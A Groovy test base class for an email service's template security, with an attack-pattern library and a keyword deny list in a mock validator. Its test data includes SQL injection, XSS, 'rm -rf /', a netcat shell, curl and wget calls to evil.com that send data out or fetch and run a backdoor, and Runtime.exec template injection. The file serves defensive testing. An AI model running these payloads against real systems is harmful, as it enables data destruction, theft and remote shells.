#!/usr/bin/env groovy

package umig.tests.unit.security

import java.util.UUID
import java.sql.SQLException
import groovy.json.JsonBuilder
import groovy.text.SimpleTemplateEngine
import java.util.concurrent.ConcurrentHashMap
import java.time.LocalDateTime

/**
 * EmailSecurityTestBase - Abstract base class for email security testing
 * 
 * Provides comprehensive security testing infrastructure for UMIG EmailService,
 * including attack pattern library, mock utilities, and performance measurement.
 * 
 * Follows UMIG testing patterns:
 * - ADR-026: Specific SQL query mocking to prevent regression
 * - Simple Groovy tests (no Spock framework)
 * - Performance overhead <2ms requirement
 * - Comprehensive security attack pattern coverage
 * 
 * US-067: Email Security Implementation - Test Infrastructure
 * Coverage Target: 90%+ of security attack vectors
 * 
 * @author UMIG Test Framework
 * @since 2025-01-17 Sprint 6
 */
abstract class EmailSecurityTestBase {
    
    // Test performance tracking
    protected static final long PERFORMANCE_THRESHOLD_MS = 2L
    protected long testStartTime
    protected String currentTestName
    
    // Mock components
    protected static MockDatabaseUtil mockDb
    protected static MockEmailService emailService
    protected static Map<String, Map<String, ?>> testResults = [:]
    
    // Security constants for validation
    protected static final int MAX_VARIABLE_SIZE_BYTES = 100 * 1024  // 100KB
    protected static final int MAX_TOTAL_EMAIL_SIZE_BYTES = 500 * 1024  // 500KB
    protected static final int MAX_TEMPLATE_DEPTH = 3
    protected static final int MAX_VARIABLE_COUNT = 50
    
    /**
     * Comprehensive attack pattern library covering 25+ security vectors
     * Organized by attack category for systematic testing
     */
    protected static final Map<String, List<String>> ATTACK_PATTERNS = [
        // SQL Injection attacks
        'sql_injection': [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' UNION SELECT password FROM users WHERE '1'='1",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1/*",
            "'; INSERT INTO users VALUES('hacker','pass'); --"
        ],
        
        // Cross-Site Scripting (XSS) attacks
        'xss_attacks': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "data:text/html,<script>alert('XSS')</script>",
            "<style>@import 'javascript:alert(\"XSS\")';</style>"
        ],
        
        // Command injection attacks
        'command_injection': [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc -l -p 4444 -e /bin/sh",
            "`rm -rf /tmp/*`",
            "\$(whoami)",
            "; curl evil.com/steal.php?data=\$(cat /etc/hosts)",
            "&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && sh /tmp/backdoor.sh",
            "'; system('rm -rf /'); ''"
        ],
        
        // Template injection attacks
        'template_injection': [
            "\${Runtime.getRuntime().exec('rm -rf /')}",
            "\${Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('whoami')}",
            "\${new File('/etc/passwd').text}",
            "\${System.getProperty('user.dir')}",
            "\${Thread.currentThread().getContextClassLoader()}",
            "\${applicationContext.getBean('dataSource')}",
            "\${groovy.sql.Sql.newInstance('jdbc:postgresql://localhost:5432/umig_app_db')}",
            "\${new groovy.text.GStringTemplateEngine().createTemplate('').make().toString()}"
        ],
        
        // System access attempts
        'system_access': [
            "system.exit(0)",
            "Runtime.getRuntime().halt(0)",
            "System.getProperty('java.class.path')",
            "System.getenv('PATH')",
            "ProcessBuilder('rm', '-rf', '/').start()",
            "new FileInputStream('/etc/passwd')",
            "Class.forName('java.lang.System').exit(0)",
            "Thread.currentThread().getThreadGroup().destroy()"
        ],
        
        // File system access attempts
        'file_access': [
            "new File('/etc/passwd').delete()",
            "new FileWriter('/tmp/malicious.txt')",
            "Files.deleteIfExists(Paths.get('/important/file'))",
            "new RandomAccessFile('/etc/hosts', 'rw')",
            "FileUtils.deleteDirectory(new File('/tmp'))",
            "new File('/').listFiles()",
            "Paths.get('../../etc/passwd')",
            "new FileOutputStream('/dev/null')"
        ],
        
        // Control flow manipulation
        'control_flow': [
            "if (true) { System.exit(0); }",
            "for (int i = 0; i < Integer.MAX_VALUE; i++) { }",
            "while (true) { Thread.sleep(1000); }",
            "switch (1) { case 1: Runtime.getRuntime().halt(0); }",
            "try { Class.forName('java.lang.System').exit(0); } catch (Exception e) { }",
            "return System.getProperty('user.home');",
            "break; System.exit(0);",
            "continue; Runtime.getRuntime().exec('rm -rf /');"
        ],
        
        // Script execution attempts
        'script_execution': [
            "eval('System.exit(0)')",
            "new GroovyShell().evaluate('System.exit(0)')",
            "Class.forName('javax.script.ScriptEngineManager')",
            "new javax.script.ScriptEngineManager().getEngineByName('groovy')",
            "Eval.me('System.exit(0)')",
            "GroovySystem.exit(0)",
            "Shell.execute('rm -rf /')",
            "ScriptEngine.eval('malicious code')"
        ],
        
        // Memory/resource exhaustion
        'resource_exhaustion': [
            "new byte[Integer.MAX_VALUE]",
            "while (true) { new ArrayList(); }",
            "String.valueOf('x').repeat(Integer.MAX_VALUE)",
            "new Thread(() -> { while (true) {} }).start()",
            "Runtime.getRuntime().gc(); System.runFinalization();",
            "new HashMap<>().put('key', new byte[1000000])",
            "IntStream.range(0, Integer.MAX_VALUE).parallel()",
            "Collections.nCopies(Integer.MAX_VALUE, 'memory bomb')"
        ]
    ]
    
    /**
     * Template nesting attack patterns for depth-based attacks
     */
    protected static final List<String> NESTING_ATTACKS = [
        // Level 1-3 (normal depth)
        "\${variable1}",
        "\${outer.\${inner}}",
        "\${level1.\${level2.\${level3}}}",
        
        // Level 4-6 (excessive depth)
        "\${a.\${b.\${c.\${d}}}}",
        "\${l1.\${l2.\${l3.\${l4.\${l5}}}}}",
        "\${deep.\${very.\${extremely.\${dangerously.\${nested.\${variable}}}}}}",
        
        // Recursive patterns
        "\${self.\${self.\${self}}}",
        "\${recursive.\${recursive}}"
    ]
    
    /**
     * Large content patterns for size-based testing
     */
    protected static Map<String, String> SIZE_ATTACK_PATTERNS = [:]
    static {
        // Generate patterns of different sizes
        SIZE_ATTACK_PATTERNS.put('small_payload', 'A' * 1000)  // 1KB
        SIZE_ATTACK_PATTERNS.put('medium_payload', 'B' * 50000)  // 50KB
        SIZE_ATTACK_PATTERNS.put('large_variable', 'C' * 150000)  // 150KB (exceeds MAX_VARIABLE_SIZE_BYTES)
        SIZE_ATTACK_PATTERNS.put('huge_template', 'D' * 600000)  // 600KB (exceeds MAX_TOTAL_EMAIL_SIZE_BYTES)
        SIZE_ATTACK_PATTERNS.put('variable_bomb', 'X' * 1000000)  // 1MB memory bomb
    }
    
    /**
     * Setup method called before each test
     */
    protected void setUp(String testName) {
        currentTestName = testName
        testStartTime = System.currentTimeMillis()
        
        // Initialize mock components
        mockDb = new MockDatabaseUtil()
        emailService = new MockEmailService()
        
        println "\n=== Starting Security Test: ${testName} ==="
    }
    
    /**
     * Teardown method called after each test
     */
    protected void tearDown() {
        long duration = System.currentTimeMillis() - testStartTime
        
        // Validate performance requirement (<2ms overhead)
        if (duration > PERFORMANCE_THRESHOLD_MS) {
            testResults[currentTestName] = [
                passed: false,
                reason: "Performance threshold exceeded: ${duration}ms > ${PERFORMANCE_THRESHOLD_MS}ms"
            ]
            println "⚠️  PERFORMANCE WARNING: Test ${currentTestName} took ${duration}ms"
        }
        
        println "=== Completed Security Test: ${currentTestName} (${duration}ms) ===\n"
    }
    
    /**
     * Test utility: Validate that dangerous patterns are blocked
     */
    protected boolean validatePatternBlocked(String pattern, String patternType) {
        try {
            // Use EmailService.validateTemplateExpression
            emailService.validateTemplateExpression(pattern)
            
            // If we reach here, pattern was NOT blocked (security failure)
            testResults[currentTestName + "_" + patternType] = [
                passed: false,
                reason: "Dangerous pattern '${pattern}' was NOT blocked by validateTemplateExpression"
            ]
            println "❌ SECURITY FAILURE: Pattern '${pattern}' (${patternType}) was not blocked"
            return false
            
        } catch (SecurityException se) {
            // Pattern was correctly blocked
            println "✅ SECURITY SUCCESS: Pattern '${pattern}' (${patternType}) correctly blocked"
            return true
            
        } catch (Exception e) {
            // Unexpected error
            testResults[currentTestName + "_" + patternType] = [
                passed: false,
                reason: "Unexpected error testing pattern '${pattern}': ${e.message}"
            ]
            println "❌ SECURITY ERROR: Unexpected error testing pattern '${pattern}': ${e.message}"
            return false
        }
    }
    
    /**
     * Test utility: Validate content size limits
     */
    protected boolean validateSizeLimit(Map variables, String template) {
        try {
            emailService.validateContentSize(variables, template)
            return true
        } catch (SecurityException se) {
            println "✅ SIZE LIMIT: Content size correctly rejected: ${se.message}"
            return true  // Size limit correctly enforced
        } catch (Exception e) {
            println "❌ SIZE ERROR: Unexpected error: ${e.message}"
            return false
        }
    }
    
    /**
     * Test utility: Create oversized variables for testing
     */
    protected Map createOversizedVariables() {
        return [
            normal_var: "Normal content",
            large_var: SIZE_ATTACK_PATTERNS.large_variable,
            variable_bomb: SIZE_ATTACK_PATTERNS.variable_bomb
        ]
    }
    
    /**
     * Test utility: Create nested template with specified depth
     */
    protected String createNestedTemplate(int depth) {
        if (depth <= 0) return "base_value"
        return "\${level${depth}.\${${createNestedTemplate(depth - 1)}}}"
    }
    
    /**
     * Test utility: Run comprehensive pattern test suite
     */
    protected Map runPatternTestSuite(List<String> patterns, String patternType) {
        Map results = [passed: 0, failed: 0, total: patterns.size()]
        
        patterns.each { pattern ->
            if (validatePatternBlocked(pattern, patternType)) {
                results.passed++
            } else {
                results.failed++
            }
        }
        
        return results
    }
    
    /**
     * Generate test report for all executed tests
     */
    protected void generateSecurityTestReport() {
        println "\n" + "="*80
        println "EMAIL SECURITY TEST REPORT"
        println "="*80
        
        int totalTests = testResults.size()
        int passedTests = (testResults.count { (it.value as Map).passed != false }) as int
        int failedTests = totalTests - passedTests
        
        println "Total Security Tests: ${totalTests}"
        println "Passed: ${passedTests}"
        println "Failed: ${failedTests}"
        println "Success Rate: ${totalTests > 0 ? Math.round((((passedTests as double)/(totalTests as double)) * 100.0) as double) : 0}%"
        
        if (failedTests > 0) {
            println "\nFAILED TESTS:"
            testResults.findAll { (it.value as Map).passed == false }.each { test, result ->
                println "❌ ${test}: ${result.reason}"
            }
        }
        
        println "\nSECURITY PATTERNS COVERAGE:"
        ATTACK_PATTERNS.each { category, patterns ->
            println "- ${category}: ${patterns.size()} patterns"
        }
        println "- nesting_attacks: ${NESTING_ATTACKS.size()} patterns"
        println "- size_attacks: ${SIZE_ATTACK_PATTERNS.size()} patterns"
        println "Total Attack Patterns: ${ATTACK_PATTERNS.values().flatten().size() + NESTING_ATTACKS.size() + SIZE_ATTACK_PATTERNS.size()}"
        
        println "="*80
    }
    
    /**
     * Abstract method to be implemented by concrete test classes
     */
    abstract void runSecurityTests()
}

/**
 * MockDatabaseUtil - Simplified mock for EmailService database dependencies
 * Follows ADR-026 pattern for specific SQL query mocking
 */
class MockDatabaseUtil {
    static def withSql(Closure closure) {
        def mockSql = new MockSql()
        return closure.call(mockSql)
    }
}

class MockSql {
    def rows(String query, params = [:]) {
        // Mock email template queries
        if (query.contains("SELECT template_text FROM email_templates")) {
            return [[template_text: "Test template: \${variable1}"]]
        }
        
        // Mock audit log inserts
        if (query.contains("INSERT INTO audit_log_aud")) {
            return [:]
        }
        
        return []
    }
    
    def firstRow(String query, params = [:]) {
        def result = rows(query, params)
        return result ? (result as List)[0] : null
    }
    
    def execute(String query, params = [:]) {
        return true
    }
}

/**
 * MockEmailService - Wrapper around actual EmailService for security testing
 * Provides controlled testing environment with security validation
 */
class MockEmailService {
    
    // Security constants (mirrored from EmailService)
    private static final int MAX_VARIABLE_SIZE_BYTES = 100 * 1024
    private static final int MAX_TOTAL_EMAIL_SIZE_BYTES = 500 * 1024
    
    /**
     * Mock implementation of validateTemplateExpression
     * Tests actual security patterns from Phase 1 implementation
     */
    void validateTemplateExpression(String templateText) {
        if (!templateText) return
        
        // Convert to lowercase for case-insensitive detection
        String lowerTemplate = templateText.toLowerCase()
        
        // Check for dangerous patterns (mirroring actual EmailService implementation)
        List<String> dangerousPatterns = [
            'system.', 'runtime.', 'process', 'file.', 'execute',
            'eval', 'script', 'class.forname', 'thread.',
            'if ', 'for ', 'while ', 'switch ', 'return',
            'break;', 'continue;', 'try {', 'catch '
        ]
        
        for (String pattern : dangerousPatterns) {
            if (lowerTemplate.contains(pattern)) {
                throw new SecurityException("Template contains dangerous pattern: ${pattern}")
            }
        }
    }
    
    /**
     * Mock implementation of validateContentSize
     * Tests size limits from Phase 1 implementation
     */
    void validateContentSize(Map variables, String templateText) {
        // Calculate total size
        long totalSize = templateText?.length() ?: 0
        
        variables?.each { key, value ->
            String strValue = value?.toString() ?: ""
            
            // Check individual variable size
            if (strValue.length() > MAX_VARIABLE_SIZE_BYTES) {
                throw new SecurityException("Variable '${key}' exceeds maximum size: ${strValue.length()} > ${MAX_VARIABLE_SIZE_BYTES}")
            }
            
            totalSize += strValue.length()
        }
        
        // Check total email size
        if (totalSize > MAX_TOTAL_EMAIL_SIZE_BYTES) {
            throw new SecurityException("Total email size exceeds maximum: ${totalSize} > ${MAX_TOTAL_EMAIL_SIZE_BYTES}")
        }
    }
    
    /**
     * Mock template processing for integration testing
     */
    String processNotificationTemplate(Map variables, String templateText) {
        // Validate security first
        validateTemplateExpression(templateText)
        validateContentSize(variables, templateText)
        
        // Simple template processing for testing
        String result = templateText
        variables?.each { key, value ->
            result = result.replace("\${${key}}", value?.toString() ?: "")
        }
        
        return result
    }
}